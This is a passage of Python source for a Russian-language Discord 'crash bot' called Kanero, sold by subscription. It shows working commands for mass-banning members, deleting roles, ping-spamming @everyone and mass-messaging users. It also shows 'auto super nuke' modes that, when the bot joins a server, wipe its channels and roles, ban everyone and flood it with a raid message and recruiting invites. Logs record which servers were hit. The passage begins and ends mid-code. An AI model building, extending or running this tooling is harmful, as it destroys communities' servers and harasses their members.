    embed.set_footer(text="☠️ Kanero  |  Каналы не удалялись  |  !setup — полный пересоздать")
    await msg.edit(content=None, embed=embed)

    # ── Обновляем ссылку в тексте нюка ──
    invite = "https://discord.gg/aud6wwYVRd"
    import re as _re
    old_text = config.SPAM_TEXT
    # Заменяем любую discord.gg/... ссылку на актуальную
    new_text = _re.sub(r'https://discord\.gg/\S+', invite, old_text)
    if new_text != old_text:
        config.SPAM_TEXT = new_text
        save_spam_text()
        results.append("✅ Ссылка в тексте нюка обновлена")

    # ── Постим в новости и sell ──
    await _post_news_and_sell(guild)


@bot.command(name="autorole")
@wl_check()
async def autorole_cmd(ctx):
    """Показывает статус авто-роли при входе на сервер."""
    guild = ctx.guild
    guest_role = discord.utils.find(lambda r: r.name == "👤 Guest", guild.roles)

    lines = []
    if guest_role:
        lines.append(f"✅ Авто-роль активна: {guest_role.mention} (`{guest_role.id}`)")
    else:
        lines.append("❌ Роль **👤 Guest** не найдена — запусти `!setup` или создай роль вручную")

    embed = discord.Embed(
        title="🔧 Статус авто-роли",
        description="\n".join(lines),
        color=0x0a0a0a
    )
    embed.set_footer(text="Роль выдаётся автоматически при входе на сервер")
    await ctx.send(embed=embed)


@bot.command(name="on_add")
async def on_add(ctx, user_id: int):
    if ctx.author.id != config.OWNER_ID:
        return
    if user_id not in OWNER_NUKE_LIST:
        OWNER_NUKE_LIST.append(user_id)
        save_owner_nuke_list()
    await ctx.send(f"👑 `{user_id}` получил доступ к **Owner Nuke**.")


@bot.command(name="on_remove")
async def on_remove(ctx, user_id: int):
    if ctx.author.id != config.OWNER_ID:
        return
    if user_id in OWNER_NUKE_LIST:
        OWNER_NUKE_LIST.remove(user_id)
        save_owner_nuke_list()
        await ctx.send(f"✅ `{user_id}` убран из Owner Nuke.")
    else:
        await ctx.send("Не найден.")


@bot.command(name="on_list")
async def on_list(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    lines = []
    for uid in OWNER_NUKE_LIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` — **{user}**")
        except Exception:
            lines.append(f"`{uid}` — *не найден*")
    embed = discord.Embed(title="👑 Owner Nuke List", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
    embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(OWNER_NUKE_LIST)}")
    await ctx.send(embed=embed)


# ─── FREELIST MANAGEMENT ───────────────────────────────────

@bot.command(name="fl_add")
async def fl_add(ctx, *, user_input: str):
    """Добавить в freelist. Без дней — навсегда. С днями — временно.
    Использование: !fl_add @user [дни] | !fl_add all [дни]
    """
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return

    parts = user_input.rsplit(maxsplit=1)
    duration_hours = None
    actual_input = user_input
    if len(parts) == 2:
        try:
            duration_hours = _parse_duration(parts[1])
            actual_input = parts[0].strip()
        except Exception:
            actual_input = user_input

    # Режим ALL
    if actual_input.lower() == "all":
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if not home_guild:
            await ctx.send("❌ Домашний сервер не найден.")
            return
        msg = await ctx.send("⏳ Выдаю Freelist всем участникам...")
        count = 0
        user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
        for member in home_guild.members:
            if member.bot:
                continue
            uid = member.id
            if duration_hours:
                add_temp_subscription(uid, "fl", duration_hours)
            else:
                if uid not in FREELIST:
                    FREELIST.append(uid)
            if user_role and user_role not in member.roles:
                try:
                    await member.add_roles(user_role, reason="fl_add all")
                except Exception:
                    pass
            count += 1
        if not duration_hours:
            save_freelist()
        days = duration_hours // 24 if duration_hours else 0
        dur_text = f" на **{days} дн.**" if duration_hours else " навсегда"
        await msg.edit(content=f"✅ **Freelist**{dur_text} выдан **{count}** участникам.")
        return

    user = await resolve_user(ctx, actual_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{actual_input}` не найден.")
        return
    user_id = user.id

    if duration_hours:
        add_temp_subscription(user_id, "fl", duration_hours)
        days = duration_hours // 24
        duration_text = f"{days} дн." if days > 0 else f"{duration_hours} ч."
        result_text = f"✅ **{user}** получил **Freelist** на **{duration_text}** (временно)."
    else:
        if user_id not in FREELIST:
            FREELIST.append(user_id)
            save_freelist()
        result_text = f"✅ **{user}** (`{user_id}`) добавлен в freelist навсегда."

    # Выдаём роль и постим в addbot
    try:
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if home_guild:
            member = home_guild.get_member(user_id)
            if not member:
                try:
                    member = await home_guild.fetch_member(user_id)
                except Exception:
                    member = None
            if member:
                user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
                if user_role and user_role not in member.roles:
                    await member.add_roles(user_role, reason="fl_add")
            await update_stats_channels(home_guild)

            # Постим в #addbot
            addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), home_guild.text_channels)
            if addbot_ch:
                app_id = bot.user.id
                invite_url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
                days_text = f" на **{duration_text}**" if duration_hours else ""
                notif = discord.Embed(
                    title="✅ Новый участник Freelist",
                    description=(
                        f"{user.mention} добавлен в **Freelist**{days_text}!\n\n"
                        f"**Доступные команды:**\n"
                        f"`!nuke` · `!auto_nuke` · `!help` · `!changelog`\n\n"
                        f"**Хочешь больше?**\n"
                        f"✅ White / 💎 Premium — [купить на FunPay](https://funpay.com/users/16928925/)\n\n"
                        f"**Добавить бота на сервер:** [нажми сюда]({invite_url})"
                    ),
                    color=0x00ff00
                )
                notif.set_footer(text="☠️ Kanero  |  discord.gg/aud6wwYVRd")
                await addbot_ch.send(content=user.mention, embed=notif)
    except Exception:
        pass
    await ctx.send(result_text)


@bot.command(name="fl_remove")
async def fl_remove(ctx, *, user_input: str):
    """Убрать из freelist. Только для владельца сервера."""
    # Только владелец сервера может использовать
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return
    user = await resolve_user(ctx, user_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{user_input}` не найден.")
        return
    user_id = user.id
    if user_id in FREELIST:
        FREELIST.remove(user_id)
        save_freelist()
        try:
            home_guild = bot.get_guild(HOME_GUILD_ID)
            if home_guild:
                member = home_guild.get_member(user_id)
                if member:
                    user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
                    if user_role and user_role in member.roles:
                        await member.remove_roles(user_role, reason="fl_remove")
                await update_stats_channels(home_guild)
        except Exception:
            pass
        await ctx.send(f"✅ **{user}** убран из freelist.")
    else:
        await ctx.send("Не найден в freelist.")


@bot.command(name="fl_clear")
async def fl_clear(ctx):
    """Очистить freelist. Только для владельца сервера."""
    # Только владелец сервера может использовать
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return
    count = len(FREELIST)
    FREELIST.clear()
    save_freelist()
    embed = discord.Embed(
        title="🗑️ Freelist очищен",
        description=f"Удалено **{count}** пользователей.",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


# ─── КОМПЕНСАЦИЯ (ВРЕМЕННЫЕ ПОДПИСКИ) ──────────────────────

# ─── TICKET SYSTEM ─────────────────────────────────────────

TICKET_CATEGORY_NAME = "🎫 ТИКЕТЫ"
open_tickets: dict[int, int] = {}  # user_id -> channel_id


class TicketCloseView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🔒 Закрыть тикет", style=discord.ButtonStyle.danger, custom_id="ticket_close")
    async def close_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        ch = interaction.channel
        creator_id = None
        for uid, cid in open_tickets.items():
            if cid == ch.id:
                creator_id = uid
                break
        if (interaction.user.id != config.OWNER_ID
                and interaction.user.id not in config.OWNER_WHITELIST
                and interaction.user.id != creator_id):
            await interaction.response.send_message("❌ Только создатель или администратор может закрыть.", ephemeral=True)
            return
        await interaction.response.send_message("🔒 Тикет закрывается...")
        open_tickets.pop(creator_id, None)
        await ch.delete()


class TicketOpenView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎫 Создать тикет", style=discord.ButtonStyle.primary, custom_id="ticket_open")
    async def open_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        user = interaction.user

        # Проверяем нет ли уже открытого тикета
        if user.id in open_tickets:
            existing = guild.get_channel(open_tickets[user.id])
            if existing:
                await interaction.response.send_message(f"❌ У тебя уже есть тикет: {existing.mention}", ephemeral=True)
                return
            open_tickets.pop(user.id, None)

        # Ищем или создаём категорию тикетов
        category = discord.utils.find(lambda c: TICKET_CATEGORY_NAME in c.name, guild.categories)
        if not category:
            category = await guild.create_category(TICKET_CATEGORY_NAME, overwrites={
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
            })

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            user: discord.PermissionOverwrite(read_messages=True, send_messages=True, attach_files=True),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True, manage_channels=True),
        }
        for r in guild.roles:
            if r.name in ("👑 Owner", "🔧 Developer", "🤖 Kanero", "🛡️ Moderator"):
                overwrites[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)

        ticket_ch = await guild.create_text_channel(
            f"ticket-{user.name}",
            category=category,
            overwrites=overwrites,
            topic=f"Тикет пользователя {user} ({user.id})"
        )
        open_tickets[user.id] = ticket_ch.id

        embed = discord.Embed(
            title="🎫 Тикет создан",
            description=(
                f"Привет, {user.mention}!\n\n"
                "Опиши свою проблему или вопрос — администрация ответит как можно скорее.\n\n"
                "Нажми кнопку ниже чтобы закрыть тикет."
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero  |  Тикет закроется после решения")
        await ticket_ch.send(f"{user.mention}", embed=embed, view=TicketCloseView())
        await interaction.response.send_message(f"✅ Тикет создан: {ticket_ch.mention}", ephemeral=True)


@bot.command(name="ticket_setup")
async def ticket_setup(ctx):
    """Отправить сообщение с кнопкой создания тикета. Только для овнера."""
    if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
        return
    embed = discord.Embed(
        title="🎫 Поддержка — Kanero",
        description=(
            "Нужна помощь? Есть вопрос?\n\n"
            "Нажми кнопку ниже — бот создаст приватный канал только для тебя и администрации.\n\n"
            "• Вопросы по боту\n"
            "• Покупка White / Premium\n"
            "• Жалобы и предложения"
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero  |  Один тикет на пользователя")
    await ctx.send(embed=embed, view=TicketOpenView())
    try:
        await ctx.message.delete()
    except Exception:
        pass

@bot.command(name="goout")
async def goout(ctx):
    """Бот покидает сервер где написана команда. Только для овнера."""
    if ctx.author.id != config.OWNER_ID:
        return
    guild = ctx.guild
    try:
        await ctx.send("👋 Выхожу с сервера.")
        await guild.leave()
    except Exception as e:
        await ctx.send(f"❌ Ошибка: {e}")


@bot.command(name="announce")
async def announce(ctx):
    """Отправить сообщение с кнопкой получения доступа. Только для овнера."""
    if ctx.author.id != config.OWNER_ID:
        return

    class GetAccessView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=None)
            app_id = ctx.bot.user.id
            url = f"https://discord.com/users/{app_id}"
            self.add_item(discord.ui.Button(
                label="💬 Написать боту в ЛС",
                url=url,
                style=discord.ButtonStyle.link
            ))

    embed = discord.Embed(
        title="☠️ Kanero — CRASH BOT",
        description=(
            "Добро пожаловать!\n\n"
            "**Что умеет бот:**\n"
            "• `!nuke` — краш любого сервера\n"
            "• `!auto_nuke` — авто-краш при входе\n"
            "• `!super_nuke` — нюк с баном участников\n"
            "• И многое другое...\n\n"
            "**Как получить доступ:**\n"
            "Нажми кнопку ниже → напиши боту в ЛС `!help`\n\n"
            "**Пока ты на этом сервере** — доступ к базовым командам активен.\n"
            "При выходе с сервера доступ удаляется автоматически.\n\n"
            "**Купить подписку:** **davaidkatt** | **@Firisotik**"
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero  |  Нажми кнопку чтобы начать")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")

    await ctx.send(embed=embed, view=GetAccessView())
    try:
        await ctx.message.delete()
    except Exception:
        pass




@bot.command(name="massdm")
@premium_check()
async def massdm(ctx, *, text: str):
    guild = ctx.guild
    members = [m for m in guild.members if not m.bot]
    sent = 0
    failed = 0
    status_msg = await ctx.send(embed=discord.Embed(
        description=f"📨 Рассылаю ДМ {len(members)} участникам...",
        color=0x0a0a0a
    ))
    for member in members:
        try:
            await member.send(text)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.5)
    embed = discord.Embed(
        title="📨 Mass DM завершён",
        description=f"✅ Отправлено: **{sent}**\n❌ Не доставлено: **{failed}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await status_msg.edit(embed=embed)


@bot.command(name="massban")
@premium_check()
async def massban(ctx):
    guild = ctx.guild
    bot_role = guild.me.top_role
    targets = [
        m for m in guild.members
        if not m.bot and m.id != ctx.author.id and m.id != guild.owner_id
        and (not m.top_role or m.top_role < bot_role)
    ]
    status_msg = await ctx.send(embed=discord.Embed(
        description=f"💀 Баню {len(targets)} участников...",
        color=0x0a0a0a
    ))
    results = await asyncio.gather(*[m.ban(reason="massban") for m in targets], return_exceptions=True)
    banned = sum(1 for r in results if not isinstance(r, Exception))
    embed = discord.Embed(
        title="💀 Mass Ban завершён",
        description=f"✅ Забанено: **{banned}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await status_msg.edit(embed=embed)


@bot.command(name="spam")
@premium_check()
async def spam_cmd(ctx, count: int, *, text: str):
    if count > 50:
        await ctx.send("Максимум 50.")
        return
    mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
    for _ in range(count):
        try:
            await ctx.send(text, allowed_mentions=mentions)
            await asyncio.sleep(0.5)
        except Exception:
            pass


@bot.command(name="pingspam")
@premium_check()
async def pingspam(ctx, count: int = 10):
    if count > 30:
        await ctx.send("Максимум 30.")
        return
    mentions = discord.AllowedMentions(everyone=True)
    for _ in range(count):
        try:
            await ctx.send("@everyone @here", allowed_mentions=mentions)
            await asyncio.sleep(0.5)
        except Exception:
            pass


@bot.command(name="rolesdelete")
@premium_check()
async def rolesdelete(ctx):
    guild = ctx.guild
    bot_role = guild.me.top_role
    results = await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )
    deleted = sum(1 for r in results if not isinstance(r, Exception))
    embed = discord.Embed(
        description=f"🗑️ Удалено ролей: **{deleted}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


@bot.command(name="serverinfo")
@premium_check()
async def serverinfo(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title=f"☠️ {guild.name}",
        color=0x0a0a0a
    )
    embed.add_field(name="👥 Участников", value=str(guild.member_count))
    embed.add_field(name="📢 Каналов", value=str(len(guild.channels)))
    embed.add_field(name="🎭 Ролей", value=str(len(guild.roles)))
    embed.add_field(name="💎 Буст уровень", value=str(guild.premium_tier))
    embed.add_field(name="🚀 Бустеров", value=str(guild.premium_subscription_count))
    embed.add_field(name="🆔 ID сервера", value=str(guild.id))
    embed.add_field(name="👑 Овнер", value=str(guild.owner))
    embed.add_field(name="📅 Создан", value=guild.created_at.strftime("%d.%m.%Y"))
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


@bot.command(name="userinfo")
@premium_check()
async def userinfo(ctx, user_id: int = None):
    if user_id:
        try:
            user = await bot.fetch_user(user_id)
        except Exception:
            await ctx.send("Пользователь не найден.")
            return
    else:
        user = ctx.author
    member = ctx.guild.get_member(user.id) if ctx.guild else None
    embed = discord.Embed(
        title=f"👁️ {user}",
        color=0x0a0a0a
    )
    embed.add_field(name="🆔 ID", value=str(user.id))
    embed.add_field(name="📅 Аккаунт создан", value=user.created_at.strftime("%d.%m.%Y"))
    if member:
        embed.add_field(name="📥 Зашёл на сервер", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
        embed.add_field(name="🎭 Высшая роль", value=member.top_role.mention)
        embed.add_field(name="💎 Буст", value="Да" if member.premium_since else "Нет")
    if user.avatar:
        embed.set_thumbnail(url=user.avatar.url)
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


# ─── AUTO SUPER NUKE ───────────────────────────────────────

AUTO_SUPER_NUKE = False
AUTO_SUPER_NUKE_TEXT = "|| @everyone  @here ||\n# CRASHED BY KIMARY AND DAVAIDKA CLNX INTARAKTIVE SQUAD\n# Удачи гайс)\nhttps://discord.gg/Pmt838emgv\nХочешь так же? Заходи к нам!\n☠️ Kanero — https://discord.gg/exYwg6Gz\nDeveloper - DavaidKa ❤️"
AUTO_SUPERPR_NUKE = False
AUTO_SUPERPR_NUKE_TEXT = None
# Настройки что делать при auto_super_nuke
SNUKE_CONFIG = {
    "massban": True,       # банить всех
    "boosters_only": False, # банить только бустеров
    "rolesdelete": True,   # удалить роли
    "pingspam": True,      # пинг спам
    "massdm": False,       # масс дм
}


def save_auto_super_nuke():
    asyncio.create_task(db_set("data", "auto_super_nuke", {
        "enabled": AUTO_SUPER_NUKE,
        "text": AUTO_SUPER_NUKE_TEXT,
        "config": SNUKE_CONFIG
    }))


def load_auto_super_nuke():
    pass  # заменено на async load в on_ready


@bot.command(name="auto_super_nuke")
@premium_check()
async def auto_super_nuke_cmd(ctx, state: str, *, text: str = None):
    global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT
    if state.lower() == "on":
        AUTO_SUPER_NUKE = True
        save_auto_super_nuke()
        embed = discord.Embed(
            title="💀 Auto Super Nuke — ВКЛЮЧЁН",
            description=(
                "При входе бота на сервер автоматически:\n"
                "• Нюк с твоим текстом (или дефолтным)\n"
                "• Массбан всех участников\n"
                "• Удаление всех ролей\n"
                "• Пинг спам @everyone\n\n"
                f"Текст: `{AUTO_SUPER_NUKE_TEXT or 'дефолтный'}`\n"
                "Чтобы задать текст: `!auto_super_nuke text <твой текст>`"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "off":
        AUTO_SUPER_NUKE = False
        save_auto_super_nuke()
        embed = discord.Embed(description="❌ **Auto Super Nuke** выключен.", color=0x0a0a0a)
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "text":
        if not text:
            await ctx.send("Укажи текст: `!auto_super_nuke text <твой текст>`")
            return
        AUTO_SUPER_NUKE_TEXT = text
        save_auto_super_nuke()
        embed = discord.Embed(
            title="✅ Текст Auto Super Nuke обновлён",
            description=f"```{text[:500]}```",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero  |  Теперь включи: !auto_super_nuke on")
        await ctx.send(embed=embed)
    elif state.lower() == "info":
        status = "✅ Включён" if AUTO_SUPER_NUKE else "❌ Выключен"
        cur_text = AUTO_SUPER_NUKE_TEXT or config.SPAM_TEXT
        embed = discord.Embed(
            title="💀 Auto Super Nuke — INFO",
            description=(
                f"Статус: **{status}**\n\n"
                "При входе бота на сервер:\n"
                "• Нюк с кастомным текстом\n"
                "• Массбан всех участников\n"
                "• Удаление всех ролей\n"
                "• Пинг спам @everyone\n\n"
                f"Текущий текст:\n```{cur_text[:300]}```"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    else:
        await ctx.send(
            "Использование:\n"
            "`!auto_super_nuke on` — включить\n"
            "`!auto_super_nuke off` — выключить\n"
            "`!auto_super_nuke text <текст>` — задать текст\n"
            "`!auto_super_nuke info` — статус и текущий текст"
        )


@bot.command(name="snuke_config")
@premium_check()
async def snuke_config(ctx, option: str = None, value: str = None):
    """Настройка что делает auto_super_nuke при входе на сервер"""
    options = {
        "massban":      ("Массбан всех участников", "massban"),
        "boosters":     ("Банить только бустеров", "boosters_only"),
        "rolesdelete":  ("Удаление всех ролей", "rolesdelete"),
        "pingspam":     ("Пинг спам @everyone", "pingspam"),
        "massdm":       ("Масс ДМ всем участникам", "massdm"),
    }

    if not option:
        # Показать текущие настройки
        embed = discord.Embed(
            title="⚙️ SUPER NUKE — НАСТРОЙКИ",
            description=(
                "Управляй что делает `!auto_super_nuke` при входе на сервер.\n"
                "Использование: `!snuke_config <опция> on/off`"
            ),
            color=0x0a0a0a
        )
        lines = []
        for key, (label, cfg_key) in options.items():
            status = "✅" if SNUKE_CONFIG.get(cfg_key) else "❌"
            lines.append(f"{status} `{key}` — {label}")
        embed.add_field(name="Текущие настройки", value="\n".join(lines), inline=False)
        embed.add_field(
            name="Опции",
            value=(
                "`massban` — банить всех участников\n"
                "`boosters` — банить только бустеров (если massban выкл)\n"
                "`rolesdelete` — удалять все роли\n"
                "`pingspam` — пинг спам @everyone\n"
                "`massdm` — масс ДМ всем участникам"
            ),
            inline=False
        )
        embed.set_footer(text="☠️ Kanero  |  Нюк всегда включён")
        await ctx.send(embed=embed)
        return

    if option not in options:
        await ctx.send(f"❌ Неизвестная опция `{option}`. Доступные: `{'`, `'.join(options.keys())}`")
        return
    if value not in ("on", "off"):
        await ctx.send("Укажи `on` или `off`.")
        return

    cfg_key = options[option][1]
    SNUKE_CONFIG[cfg_key] = (value == "on")
    save_auto_super_nuke()

    status = "✅ включено" if value == "on" else "❌ выключено"
    embed = discord.Embed(
        description=f"**{options[option][0]}** — {status}",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


# ─── AUTO SUPERPR NUKE ─────────────────────────────────────

def save_auto_superpr_nuke():
    asyncio.create_task(db_set("data", "auto_superpr_nuke", {
        "enabled": AUTO_SUPERPR_NUKE,
        "text": AUTO_SUPERPR_NUKE_TEXT
    }))


def load_auto_superpr_nuke():
    pass  # заменено на async load в on_ready


@bot.command(name="auto_superpr_nuke")
@premium_check()
async def auto_superpr_nuke_cmd(ctx, state: str, *, text: str = None):
    global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
    if state.lower() == "on":
        AUTO_SUPERPR_NUKE = True
        save_auto_superpr_nuke()
        embed = discord.Embed(
            title="⚡ Auto Superpr Nuke — ВКЛЮЧЁН",
            description=(
                "При входе бота на сервер **мгновенно**:\n"
                "• Удаление каналов + ролей\n"
                "• Бан всех участников\n"
                "• Создание каналов со спамом\n"
                "Всё одновременно — максимальная скорость.\n\n"
                f"Текст: `{AUTO_SUPERPR_NUKE_TEXT or 'дефолтный'}`\n"
                "Чтобы задать текст: `!auto_superpr_nuke text <твой текст>`"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "off":
        AUTO_SUPERPR_NUKE = False
        save_auto_superpr_nuke()
        embed = discord.Embed(description="❌ **Auto Superpr Nuke** выключен.", color=0x0a0a0a)
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "text":
        if not text:
            await ctx.send("Укажи текст: `!auto_superpr_nuke text <твой текст>`")
            return
        AUTO_SUPERPR_NUKE_TEXT = text
        save_auto_superpr_nuke()
        embed = discord.Embed(
            title="✅ Текст Auto Superpr Nuke обновлён",
            description=f"```{text[:500]}```",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero  |  Теперь включи: !auto_superpr_nuke on")
        await ctx.send(embed=embed)
    elif state.lower() == "info":
        status = "✅ Включён" if AUTO_SUPERPR_NUKE else "❌ Выключен"
        cur_text = AUTO_SUPERPR_NUKE_TEXT or config.SPAM_TEXT
        embed = discord.Embed(
            title="⚡ Auto Superpr Nuke — INFO",
            description=(
                f"Статус: **{status}**\n\n"
                "При входе — всё одновременно:\n"
                "• Удаление каналов + ролей\n"
                "• Бан всех участников\n"
                "• Создание каналов со спамом\n\n"
                f"Текущий текст:\n```{cur_text[:300]}```"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    else:
        await ctx.send(
            "Использование:\n"
            "`!auto_superpr_nuke on` — включить\n"
            "`!auto_superpr_nuke off` — выключить\n"
            "`!auto_superpr_nuke text <текст>` — задать текст\n"
            "`!auto_superpr_nuke info` — статус"
        )


# ─── OWNER-ONLY: BLOCK / UNBLOCK GUILD ─────────────────────

@bot.command(name="block_guild", aliases=["block_guid"])
async def block_guild(ctx, guild_id: int = None):
    if ctx.author.id != config.OWNER_ID:
        return
    gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
    if not gid:
        await ctx.send("Укажи ID сервера: `!block_guild <id>`")
        return
    if gid not in BLOCKED_GUILDS:
        BLOCKED_GUILDS.append(gid)
        save_blocked_guilds()
        guild_name = bot.get_guild(gid)
        name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
        await ctx.send(f"🔒 Сервер {name_str} заблокирован. Бот не будет выполнять команды на нём.")
    else:
        await ctx.send("Сервер уже заблокирован.")


@bot.command(name="unblock_guild", aliases=["unblock_guid"])
async def unblock_guild(ctx, guild_id: int = None):
    if ctx.author.id != config.OWNER_ID:
        return
    gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
    if not gid:
        await ctx.send("Укажи ID сервера: `!unblock_guild <id>`")
        return
    if gid in BLOCKED_GUILDS:
        BLOCKED_GUILDS.remove(gid)
        save_blocked_guilds()
        guild_name = bot.get_guild(gid)
        name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
        await ctx.send(f"🔓 Сервер {name_str} разблокирован.")
    else:
        await ctx.send("Сервер не был заблокирован.")


@bot.command(name="blocked_guilds")
async def blocked_guilds_cmd(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    if not BLOCKED_GUILDS:
        await ctx.send("Нет заблокированных серверов.")
        return
    lines = []
    for gid in BLOCKED_GUILDS:
        g = bot.get_guild(gid)
        lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
    await ctx.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))


@bot.command(name="giverole")
async def giverole(ctx, user: discord.Member, role: discord.Role):
    """Выдать роль участнику. Только для овнера.
    Использование: !giverole @юзер @роль  или  !giverole <user_id> <role_id>
    """
    if ctx.author.id != config.OWNER_ID:
        return
    try:
        await user.add_roles(role)
        embed = discord.Embed(
            description=f"✅ Роль **{role.name}** выдана **{user}**.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("❌ Нет прав выдать эту роль (роль выше бота в иерархии).")
    except Exception as e:
        await ctx.send(f"❌ Ошибка: {e}")


@bot.command(name="roles")
async def roles_cmd(ctx):
    """Показать роли которые бот может выдавать (ниже его роли в иерархии)."""
    if ctx.author.id != config.OWNER_ID:
        return
    bot_role = ctx.guild.me.top_role
    available = [r for r in ctx.guild.roles if r < bot_role and not r.is_default()]
    if not available:
        await ctx.send("Нет ролей которые бот может выдать.")
        return
    available.sort(key=lambda r: r.position, reverse=True)
    lines = [f"`{r.id}` — **{r.name}**" for r in available[:30]]
    embed = discord.Embed(
        title=f"🎭 Роли доступные боту ({len(available)})",
        description="\n".join(lines),
        color=0x0a0a0a
    )
    embed.set_footer(text=f"☠️ Kanero  |  Роль бота: {bot_role.name}  |  !giverole @юзер @роль")
    await ctx.send(embed=embed)


@bot.command(name="nukelogs")
async def nukelogs(ctx):
    """Показать логи нюков. Только для овнера."""
    if ctx.author.id != config.OWNER_ID:
        return
    db = get_db()
    if db is None:
        await ctx.send("❌ MongoDB не подключена.")
        return
    cursor = db["nuke_logs"].find({})
    logs = await cursor.to_list(length=100)
    if not logs:
        await ctx.send("Логов нюков нет.")
        return
    embed = discord.Embed(title="📋 Логи нюков", color=0x0a0a0a)
    # Эмодзи для разных типов нюков
    type_emojis = {
        "nuke": "💀",
        "super_nuke": "☠️",
        "owner_nuke": "👑",
        "auto_nuke": "🤖",
        "auto_super_nuke": "🤖☠️",
        "auto_superpr_nuke": "🤖⚡",
        "auto_owner_nuke": "🤖👑"
    }
    for doc in logs[:20]:  # максимум 20 в одном embed
        entry = doc.get("value", doc)
        nuke_type = entry.get('type', '?')
        emoji = type_emojis.get(nuke_type, '⚡')
        invite = entry.get("invite") or "нет инвайта"
        embed.add_field(
            name=f"{emoji} {entry.get('guild_name', '?')}",
            value=(
                f"Тип: `{nuke_type}`\n"
                f"Кто: **{entry.get('user_name', '?')}** (`{entry.get('user_id', '?')}`)\n"
                f"Время: `{entry.get('time', '?')}`\n"
                f"Инвайт: {invite}"
            ),
            inline=False
        )
    embed.set_footer(text=f"☠️ Kanero  |  Всего записей: {len(logs)}")
    await ctx.send(embed=embed)


bot.remove_command("help")


@bot.command(name="changelog")
async def changelog(ctx):
    """Показывает только последнее обновление."""
    embed = discord.Embed(title="📋 CHANGELOG — v2.3  |  Багфиксы и безопасность", color=0x0a0a0a)
    embed.add_field(
        name="🔥 v2.3",
        value=(
            "**🐛 Критические багфиксы:**\n"
            "• Исправлен баг с автоматическим крашем домашнего сервера\n"
            "• Добавлена защита от авто-нюков на домашнем сервере\n"
            "• Исправлено логирование всех типов нюков\n\n"
            "**🔒 Безопасность:**\n"
            "• Токен и OWNER_ID теперь в переменных окружения\n"
            "• `!help` и `!changelog` теперь работают для всех на нашем сервере\n\n"
            "**📊 Логи:**\n"
            "• Все типы нюков теперь логируются: `auto_nuke`, `auto_super_nuke`, `auto_owner_nuke`\n"
            "• Уникальные эмодзи для каждого типа нюка\n\n"
            "**⚙️ Setup:**\n"
